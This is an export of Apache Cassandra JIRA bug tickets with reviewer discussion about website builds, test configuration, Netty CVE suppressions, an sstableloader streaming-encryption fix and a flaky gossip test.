Patch [here|https://github.com/ekaterinadimitrova2/cassandra/commit/a0f6b89127c1955a422dec922fb2624b4dbffd84];;;","12/Feb/22 20:16;brandon.williams;+1, added a sanity check [circle run|https://app.circleci.com/pipelines/github/driftx/cassandra/360/workflows/027e2b4f-2d6e-403c-8a4a-fcf8f9b3b55c]  that looks as I expect.;;;","13/Feb/22 01:52;e.dimitrova;Thank you, I also tested locally startup when those parameters are presented in cassandra.yaml.

Patch committed for 4.0 (empty merge for trunk). I will take care of trunk separately together with docs, etc as we talked in Slack.

This ticket has the goal to fix the user experience during upgrade for potential new 4.0 patch release. NEWS.txt and CHANGES.txt updated too to remind people that those are just placeholders since some time. 

To [https://github.com/apache/cassandra.git]

   c60ad61b3b..537ad9e17b  cassandra-4.0 -> cassandra-4.0

   5cf62c6c02..0108dd2593  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cassandra-website run.sh needs to move and prep files for content/ folder,CASSANDRA-17374,13427997,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,Anthony Grasso,mck,mck,11/Feb/22 11:38,04/May/22 13:27,13/Jul/23 08:40,26/Apr/22 10:21,NA,,,,,,Documentation/Website,,,,0,,"See manual steps still required here:
https://github.com/apache/cassandra-builds/compare/trunk...thelastpickle:mck/16765#diff-1f760d89dfb81ea05a11d862007a4e4e586b38aac7ae87f62c5b2e86571809c0R1273-R1291 ",,Anthony Grasso,erickramirezau,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16765,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,anthony,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,Docs,,Tue Apr 26 10:23:03 UTC 2022,,,mck,,,,All,,,,"0|z0zht4:",9223372036854775807,,,,mck,,,,Critical,,NA,,"[1de171b|https://github.com/apache/cassandra-website/commit/1de171b910983628e1b7e19dbeac0a3bb09dbab0]",,,,,,,,,"1. Clone the cassandra-website repository.
{code:java}
$ git clone git@github.com:apache/cassandra-website.git{code}
2. Run website generation command and include document generation.
{code:java}
$ cd cassandra-website
$ ./run.sh website build -g{code}
3. Inspect _content_ directory.
 * Check if _content/doc_ directory is populated with documentation folders for the most recent versions of Cassandra (3.11, 3.11.11, 3.11.12, 4.0, 4.0.1, 4.0.2, 4.0.3, 4.1, stable, latest, trunk)

4. Run the following commands to confirm hardcoded and missing domains have been removed in URL links.
{code:java}
$ grep -rl 'https://cassandra.apache.org/' content/
$ grep -rl 'href=""//' content/ {code}
Both commands should return an empty result.",,,,,"02/Apr/22 04:58;Anthony Grasso;Opened pull request [#121|https://github.com/apache/cassandra-website/pull/121];;;","02/Apr/22 19:17;mck;reviewed and tested.
+1;;;","26/Apr/22 10:23;Anthony Grasso;Thanks [~mck] . Patch added in commit [1de171b|https://github.com/apache/cassandra-website/commit/1de171b910983628e1b7e19dbeac0a3bb09dbab0];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set the config in In-JVM upgrade tests to the old format on trunk,CASSANDRA-17369,13427589,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,09/Feb/22 20:57,27/May/22 19:25,13/Jul/23 08:40,13/Feb/22 18:07,4.1,4.1-alpha1,,,,,CI,,,,0,,"In-JVM upgrade tests do no support per-version config. 
Revert the config in In-JVM upgrade tests to the old format on trunk.

CC [~dcapwell] ",,dcapwell,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sun Feb 13 18:05:56 UTC 2022,,,,,,,All,,,,"0|z0zfag:",9223372036854775807,,,,dcapwell,,,,Low,,,,https://github.com/apache/cassandra/commit/0c87f2668d902caef51a8f281c3eb3ca57bb2924,,,,,,,,,"[Patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17369-trunk?expand=1]  | [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1374/workflows/e1492144-a7ef-4f87-8fcb-7c805eeb634a/jobs/8857/steps]

Current tests",,,,,"09/Feb/22 21:54;e.dimitrova;[Patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17369-trunk?expand=1]  | [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1374/workflows/e1492144-a7ef-4f87-8fcb-7c805eeb634a/jobs/8857/steps]

[~dcapwell], do you mind to review, please?  ;;;","11/Feb/22 21:55;dcapwell;+1 assuming tests are clean;;;","13/Feb/22 17:13;e.dimitrova;All Injvm upgrade tests were green when I submitted the patch. I will rebase and rerun them prior commit. Thank you;;;","13/Feb/22 17:18;e.dimitrova;CI running [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1383/workflows/e0ae3178-36f1-4f84-8557-4e64f53a0bcd];;;","13/Feb/22 18:00;e.dimitrova;All tests green, starting commit. ;;;","13/Feb/22 18:05;e.dimitrova;Committed, thank you

To https://github.com/apache/cassandra.git

   0108dd2593..0c87f2668d  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate OWASP failure report,CASSANDRA-17368,13427513,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,09/Feb/22 13:48,27/May/22 19:25,13/Jul/23 08:40,28/Feb/22 13:49,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Build,,,,0,,"4.0: netty-all-4.1.58.Final.jar: CVE-2021-43797, CVE-2021-37136, CVE-2021-37137

3.11: netty-all-4.0.44.Final.jar: CVE-2021-43797, CVE-2021-37136, CVE-2021-37137

3.0: netty-all-4.0.44.Final.jar: CVE-2021-43797, CVE-2021-37136, CVE-2021-37137
",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Feb 28 13:49:01 UTC 2022,,,,,,,All,,,,"0|z0zeu0:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/f18b432ce6904bd2d9f9d778e2f99715bbe5d413,,,,,,,,,run CI,,,,,"09/Feb/22 13:53;brandon.williams;CVE-2021-43797 is netty http stuff we don't use yet again.

CVE-2021-37136 is malicious input can DOS bzip2 decompression, which does not apply.

CVE-2021-37137 is roughly the same but for Snappy, which can't be exploited without having already lost the game to network or local machine access.


;;;","09/Feb/22 18:34;brandon.williams;I think since these are harmless we can add suppressions for 3.0, 3.11, and 4.0.  For trunk, we can upgrade netty-all to 4.1.73.Final. 

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17368-3.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/351/workflows/1d7c9315-6dd2-4963-9adf-f61379ecd179]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17368-3.11]|[J8|https://app.circleci.com/pipelines/github/driftx/cassandra/352/workflows/21aa6b59-09cc-4042-8a94-0b0a561408a9]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17368-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/353/workflows/634c0cf4-9d13-48f3-88df-b75e3df51d50]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17368-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/350/workflows/a7d3828f-3d35-4c01-b673-bed9319ad21b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/350/workflows/6c707186-df54-4200-9a69-783bbc4f21bd]|;;;","10/Feb/22 20:29;brandon.williams;It looks like 4.1.73.Final isn't entirely drop-in compatible with 4.1.53.Final.  I'll investigate this further.;;;","18/Feb/22 13:25;brandon.williams;I've broken out the netty upgrade to CASSANDRA-17392 so we aren't holding back the suppressions for the other branches while that is figured out, so this is ready for review.;;;","23/Feb/22 09:23;bereng;Right trunk is completely broken. Otherwise +1 to 3.0, 3.11 and 4.0.;;;","28/Feb/22 13:49;brandon.williams;Committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sstableloader ignores streaming encryption settings,CASSANDRA-17367,13427458,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dpotepalov,dpotepalov,dpotepalov,09/Feb/22 10:34,27/May/22 19:25,13/Jul/23 08:40,02/Mar/22 14:02,4.0.4,4.1,4.1-alpha1,,,,Tool/bulk load,,,,0,,"Reproducible in Cassandra 4.x. If one configures encryption for streaming in config yaml fed to sstableloader like this

{{server_encryption_options:}}
{{    internode_encryption: all}}
{{    keystore: sstableloader.keystore.p12}}
{{    keystore_password: changeit}}
{{    truststore: sstableloader.truststore.jks}}
{{    truststore_password: changeit}}


then sstableloader should perform an SSL handshake on the streaming connections and encrypt the payload. But this does not happen. Judging by the TCPdump of the outgoing traffic on the internode port, sstableloader sends plaintext traffic. This is the TCP payload of the first packet that sstableloader sends after establishing TCP connection:

{{ca 55 2d fa 0c 0c 0c 08 06 0a f0 01 f9 1b 58 a8 32 f2 d0}}

The first 4 bytes look like Cassandra protocol magic, not like a client hello.

I've discovered the issue while trying to migrate some data to a Cassandra 4 listening on the legacy ssl storage port (therefore, accepting only encrypted connections on that port). Streaming phase of the migration failed with a ""connection closed"" error, which hints that the connection was closed server-side.",,bereng,dpotepalov,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Feb/22 12:59;dpotepalov;17367-4.0.txt;https://issues.apache.org/jira/secure/attachment/13040237/17367-4.0.txt","18/Feb/22 12:59;dpotepalov;17367-trunk.txt;https://issues.apache.org/jira/secure/attachment/13040238/17367-trunk.txt",,,,2.0,dpotepalov,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 02 14:02:21 UTC 2022,,,,,,,All,,,,"0|z0zehs:",9223372036854775807,,,,berenguerblasi@gmail.com,brandon.williams,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/0e249fd15ee209594e6d85db7e81a19c67d6ad6f,,,,,,,,,run CI,,,,,"09/Feb/22 10:35;dpotepalov;I've fixed it in a local fork, preparing patches for upload, seems some parameters got lost in BulkLoadConnectionFactory.;;;","09/Feb/22 10:50;dpotepalov;Patches attached to the ticket. With this change, sstableloader performs the handshake and my migration succeeded.

Just in case - sstableloader command I used to reproduce the issue on 4.0.0:

{{sstableloader -f cassandra.yaml -d <ip>:<cqlsh port> -ssp <legacy ssl port on target> -u user -pw password <path to sstables>}}

and the exception in sstableloader output:
{noformat}
15:38:00.725 [main] DEBUG org.apache.cassandra.streaming.async.NettyStreamingMessageSender - [Stream #16fda750-88f5-11ec-b4ef-0bc683c3f5ea] Closing stream connection channels on /35.205.83.18:7000
15:38:00.728 [main] ERROR org.apache.cassandra.streaming.StreamSession - [Stream #16fda750-88f5-11ec-b4ef-0bc683c3f5ea] Streaming error occurred on session with peer 35.205.83.18:7000
java.io.IOException: failed to connect to /35.205.83.18:7000 for streaming data
	at org.apache.cassandra.streaming.DefaultConnectionFactory.createConnection(DefaultConnectionFactory.java:55)
	at org.apache.cassandra.tools.BulkLoadConnectionFactory.createConnection(BulkLoadConnectionFactory.java:52)
	at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.createChannel(NettyStreamingMessageSender.java:199)
	at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.setupControlMessageChannel(NettyStreamingMessageSender.java:180)
	at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.sendMessage(NettyStreamingMessageSender.java:245)
	at org.apache.cassandra.streaming.async.NettyStreamingMessageSender.initialize(NettyStreamingMessageSender.java:149)
	at org.apache.cassandra.streaming.StreamSession.start(StreamSession.java:362)
	at org.apache.cassandra.streaming.StreamCoordinator.startSession(StreamCoordinator.java:262)
	at org.apache.cassandra.streaming.StreamCoordinator.access$700(StreamCoordinator.java:36)
	at org.apache.cassandra.streaming.StreamCoordinator$HostStreamingData.connectAllStreamSessions(StreamCoordinator.java:308)
	at org.apache.cassandra.streaming.StreamCoordinator.connectAllStreamSessions(StreamCoordinator.java:107)
	at org.apache.cassandra.streaming.StreamCoordinator.connect(StreamCoordinator.java:101)
	at org.apache.cassandra.streaming.StreamResultFuture.createInitiator(StreamResultFuture.java:98)
	at org.apache.cassandra.streaming.StreamPlan.execute(StreamPlan.java:179)
	at org.apache.cassandra.io.sstable.SSTableLoader.stream(SSTableLoader.java:215)
	at org.apache.cassandra.tools.BulkLoader.load(BulkLoader.java:83)
	at org.apache.cassandra.tools.BulkLoader.main(BulkLoader.java:51)
Caused by: java.nio.channels.ClosedChannelException: null
	at org.apache.cassandra.net.OutboundConnectionInitiator$Handler.channelInactive(OutboundConnectionInitiator.java:248)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:262)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:248)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelInactive(AbstractChannelHandlerContext.java:241)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelInactive(DefaultChannelPipeline.java:1405)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:262)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelInactive(AbstractChannelHandlerContext.java:248)
	at io.netty.channel.DefaultChannelPipeline.fireChannelInactive(DefaultChannelPipeline.java:901)
	at io.netty.channel.AbstractChannel$AbstractUnsafe$8.run(AbstractChannel.java:819)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:164)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:472)
	at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:384)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:829)
{noformat};;;","14/Feb/22 08:09;bereng;We'll need some testing here right?;;;","14/Feb/22 14:42;dpotepalov;> We'll need some testing here right?

[~bereng] should I create a DTest for this, or will a unit test for BulkLoadConnectionFactory against some sort of mock be sufficient?;;;","14/Feb/22 15:28;dpotepalov;actually, DTest is probably overkill for this. There's the `bulkLoaderSuccessfullyConnectsOverSsl` test in SSTableLoaderEncryptionOptionsTest.java, I'll look into why it did not catch the error and patch it if necessary;;;","15/Feb/22 05:52;bereng;Thanks [~dpotepalov] that would be super useful :-);;;","18/Feb/22 13:01;dpotepalov;Attached updated patches with the test for trunk and 4.0. Seems that there was no test for sstableloader that actually did any streaming with encryption enabled, so I modified the ""bulkLoaderSuccessfullyConnectsOverSsl"" to do some streaming and verify that data is accessible on the cluster afterwards.;;;","18/Feb/22 21:42;brandon.williams;4.0: [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/372/workflows/79d13c71-76b0-4145-9871-bb9d47ee2ab2], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/372/workflows/12c899f4-0396-4c8b-bb3f-f35fc97f6b06]
trunk: [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/373/workflows/06936965-722e-43df-9a7b-7c17ff04a468], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/373/workflows/9d2fc929-37d5-4f77-b08a-ab1318e6ebc2];;;","23/Feb/22 06:03;bereng;I _think_ (and [~brandon.williams] can correct me) there were problems in the past about connecting without SSL to a node configured with SSL. Like we had to support both ways, which is why the test doesn't originally connect to the SSL port? I would leave the original test as it was and add yours as a new test method. Otherwise we'd need to also fix the other test in the class which doesn't use the SSL port either. On top of that the original test is using legacy sstables and now we'd be removing that which is suspicious.

I think it might be safer to just add your test as a new one, but I may be just imagining things in my bad memory, so I'll defer to [~brandon.williams] to see if he knows better?;;;","28/Feb/22 13:11;brandon.williams;I think we're covering the non-SSL case in [these tests|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/io/sstable/SSTableLoaderTest.java#L127].

bq.  the original test is using legacy sstables and now we'd be removing that

That is still a concern.  I think we could just go back to legacy here, so we end up with legacy/ssl and current/non-ssl test configurations.

bq. Like we had to support both ways

Hmm, I'm not sure if I recall something about this, but it doesn't really make sense... if you don't specify encryption settings, you can't expect it to work with SSL, but if you do specify it, you want it to work with either SSL or not?  I'm ok with saying explicit is better than implicit here.;;;","01/Mar/22 11:17;dpotepalov;> we could just go back to legacy here

I tried this first. This test actually did not do any streaming, because the schema was not created in the target cluster

{noformat}
[junit-timeout] Opening sstables and calculating sections to stream
[junit-timeout] Skipping file na-1-big-Data.db: table legacy_tables.legacy_na_clust doesn't exist
[junit-timeout] INFO [main] <main> 2022-03-01 11:55:23,639 StreamResultFuture.java:92 - [Stream #1850f3a0-994e-11ec-b67d-cd751ea3eb05|#1850f3a0-994e-11ec-b67d-cd751ea3eb05] Executing streaming plan for Bulk Load
[junit-timeout] 
[junit-timeout] Summary statistics: 
[junit-timeout] Connections per host : 1 
[junit-timeout] Total files transferred : 0 
{noformat}

So I created necessary keyspaces/tables, started streaming and then got this error
{noformat}
[junit-timeout] Opening sstables and calculating sections to stream
[junit-timeout] INFO  [main] <main> 2022-03-01 12:02:59,470 BufferPools.java:49 - Global buffer pool limit is 247.000MiB for chunk-cache and 61.000MiB for networking
[junit-timeout] ERROR 11:02:59 Cannot open /home/dmitry.potepalov/apache_cassandra/test/data/legacy-sstables/na/legacy_tables/legacy_na_clust/na-1-big; partitioner org.apache.cassandra.dht.ByteOrderedPartitioner does not match system partitioner org.apache.cassandra.dht.Murmur3Partitioner.  Note that the default partitioner starting with Cassandra 1.2 is Murmur3Partitioner, so you will need to edit that to match your old partitioner if upgrading.
{noformat}
I verified that the legacy sstables were indeed created with ByteOrderedPartitioner and decided that using legacy sstables is not particulary important in the context of the test, so ended up using the generated ones.

If I was wrong and using legacy sstables is important in this test, could you please provide some guidance as to how resolve the partitioner error? I don't know Cassandra very well, I simply assumed that streaming ByteOrderedPartitioner sstables to a cluster using the Murmur3Partitioner is not possible - maybe I'm wrong and there's some necessary configuration that I'm missing? I remember trying to force ByteOrderedPartitioner on the test cluster, but that failed somehow, don't have the exact error message - should I try it again?;;;","01/Mar/22 12:05;brandon.williams;Ok, thank you for the deep explanation. I think the test was just broken in multiple ways before, and I agree there's probably little value in testing legacy BOP now, especially if we weren't doing it before.  That leaves us with both unencrypted and encrypted transports tested on current sstables, which I think is good enough and better than we were before, so +1.;;;","02/Mar/22 06:20;bereng;SGTM +1;;;","02/Mar/22 14:02;brandon.williams;Committed, thanks to you both!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - gossip_test.TestGossip,CASSANDRA-17366,13427432,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,azotcsit,azotcsit,09/Feb/22 09:24,27/May/22 19:25,13/Jul/23 08:40,18/Apr/22 14:31,4.0.4,4.1,4.1-alpha1,,,,Cluster/Gossip,,,,0,,"We can see many failures for 4.x branch:

test_2dc_parallel_startup_one_seed ([916|https://ci-cassandra.apache.org/job/Cassandra-trunk/916/testReport/dtest-offheap.gossip_test/TestGossip],  [920|https://ci-cassandra.apache.org/job/Cassandra-trunk/920/testReport/dtest.gossip_test/TestGossip,])

test_2dc_parallel_startup ([929|https://ci-cassandra.apache.org/job/Cassandra-trunk/929/testReport/dtest-novnode.gossip_test/TestGossip], [931|https://ci-cassandra.apache.org/job/Cassandra-trunk/931/testReport/dtest.gossip_test/TestGossip], [936|https://ci-cassandra.apache.org/job/Cassandra-trunk/936/testReport/dtest-novnode.gossip_test/TestGossip])

test_2dc_parallel_startup_one_seed ([916|https://ci-cassandra.apache.org/job/Cassandra-trunk/916/testReport/dtest-offheap.gossip_test/TestGossip], [920|https://ci-cassandra.apache.org/job/Cassandra-trunk/920/testReport/dtest.gossip_test/TestGossip/])

The error is always the same:
{code:java}
Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [main] 2022-01-26 10:53:12,866 CassandraDaemon.java:900 - Exception encountered during startup
java.lang.RuntimeException: Didn't receive schemas for all known versions within the timeout. Use -Dcassandra.skip_schema_check=true to skip this check.
	at org.apache.cassandra.service.StorageService.waitForSchema(StorageService.java:1037)
	at org.apache.cassandra.dht.BootStrapper.allocateTokens(BootStrapper.java:232)
	at org.apache.cassandra.dht.BootStrapper.getBootstrapTokens(BootStrapper.java:180)
	at org.apache.cassandra.service.StorageService.joinTokenRing(StorageService.java:1089)
	at org.apache.cassandra.service.StorageService.joinTokenRing(StorageService.java:1043)
	at org.apache.cassandra.service.StorageService.initServer(StorageService.java:821)
	at org.apache.cassandra.service.StorageService.initServer(StorageService.java:751)
	at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:417)
	at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:754)
	at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:878), ERROR [main] 2022-01-26 10:53:12,866 CassandraDaemon.java:900 - Exception encountered during startup
java.lang.RuntimeException: Didn't receive schemas for all known versions within the timeout. Use -Dcassandra.skip_schema_check=true to skip this check.
	at org.apache.cassandra.service.StorageService.waitForSchema(StorageService.java:1037)
	at org.apache.cassandra.dht.BootStrapper.allocateTokens(BootStrapper.java:232)
	at org.apache.cassandra.dht.BootStrapper.getBootstrapTokens(BootStrapper.java:180)
	at org.apache.cassandra.service.StorageService.joinTokenRing(StorageService.java:1089)
	at org.apache.cassandra.service.StorageService.joinTokenRing(StorageService.java:1043)
	at org.apache.cassandra.service.StorageService.initServer(StorageService.java:821)
	at org.apache.cassandra.service.StorageService.initServer(StorageService.java:751)
	at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:417)
	at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:754)
	at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:878)] {code}",,azotcsit,e.dimitrova,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Apr 18 14:31:45 UTC 2022,,,,,,,All,,,,"0|z0zec0:",9223372036854775807,,,,e.dimitrova,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/49e2a8d4ad742560245b48ecd637e362cb1d74f7,,,,,,,,,Run test repeatedly in circle,,,,,"04/Apr/22 12:09;brandon.williams;-What I know so far is that these were not flaky on commit, as they pass fine there but later on begin failing.  Locating that exact point is an ongoing bisect.-

That is not true, this is actually just more difficult to bisect than I originally gauged.  [Here|https://app.circleci.com/pipelines/github/driftx/cassandra/424/workflows/3ce471bc-244d-486e-aa62-cca36e85517b/jobs/4996/tests#failed-test-0] is a circle run near the time these tests were committed illustrating the failure.;;;","05/Apr/22 14:51;brandon.williams;Confirming that is [this|https://app.circleci.com/pipelines/github/driftx/cassandra/425/workflows/d4949949-441a-47b4-b97d-12fba3574c98/jobs/5003/tests#failed-test-0] failure on 4.0 also.

I've added a longer wait for nodes to come up [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17366] and also raise an error when we exhaust the time without all the nodes returning.  Repeated runs against it: [4.0|https://app.circleci.com/pipelines/github/driftx/cassandra/427/workflows/d994077f-ec7e-424e-b7f4-cb8ef2649a0c/jobs/5006] , [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/426/workflows/937969fa-605c-4970-b3d9-4913e935d075/jobs/5007];;;","05/Apr/22 16:48;e.dimitrova;Thanks for checking back for when it was committed. Our jobs to run in a loop the tests were added after that time, this bisect just shows me one more time how useful and important is for us to be running new tests in a loop before commit. I am glad they were added.

So on commit and now it was failing with the same frequency, right? But I saw you ran it only with 4.0 to confirm that. 

I just ran it with the same circle config with trunk  [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1499/workflows/2b7e411a-78a2-44f8-9d2c-c6b645df953c/jobs/9754/parallel-runs/2?filterBy=ALL]

It hasn't finished yet, there are 3 failures... if there are more maybe we need to investigate what made it fail more often? WDYT?;;;","05/Apr/22 20:45;jonmeredith;I've been hitting this today while working on a different issue with the in-jvm BootstrapTest failing on cluster close (CASSANDRA-17524).  I can hit it on my MacBook after many runs and have instrumented the MigrationCoordinator with a bit more debug output. Will report back what I find.;;;","06/Apr/22 20:29;jonmeredith;Got to the bottom of the in-jvm dtest version and I don't think it will impact python dtests.  The in-jvm dtest override the instance uptime calculation for {{MigrationManager}}, but not for {{MigrationCoordinator}} so it was not scheduling the schema pulls immediately as the test thought instances had been up for > 60s (which was not true).;;;","06/Apr/22 20:36;brandon.williams;Thanks for the update, [~jonmeredith].

As for this test, it turns out my patch actually doesn't do anything, since we make sure the nodes are all running [right afterward|https://github.com/apache/cassandra-dtest/blob/trunk/gossip_test.py#L98].  I'll keep digging on this since that leaves us with increasing the schema delay, which at 30s seems like it should be long enough already.;;;","15/Apr/22 22:55;brandon.williams;These tests set up and then stop a cluster, subsequently starting it with some combination of seeds, and then nodes in parallel.  The problem is that the setup doesn't guarantee it will wait long enough for the cluster to be completely established, though C* is fast enough to do so anyway, _almost_ all of the time.  To ensure the setup is complete before shutting down, the nodes should wait for the CQL interface to become available after the initial startup. [This dtest branch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17366] does that, and here's 400 runs on [4.0|https://app.circleci.com/pipelines/github/driftx/cassandra/438/workflows/df01fde1-1ff1-4007-bdc2-a9de8e358a16/jobs/5145] and [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/439/workflows/c00617e8-904c-44d7-9f4f-de565e4878cf/jobs/5143].;;;","18/Apr/22 13:34;e.dimitrova;+1, thanks;;;","18/Apr/22 14:31;brandon.williams;Committed, thanks for the review.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
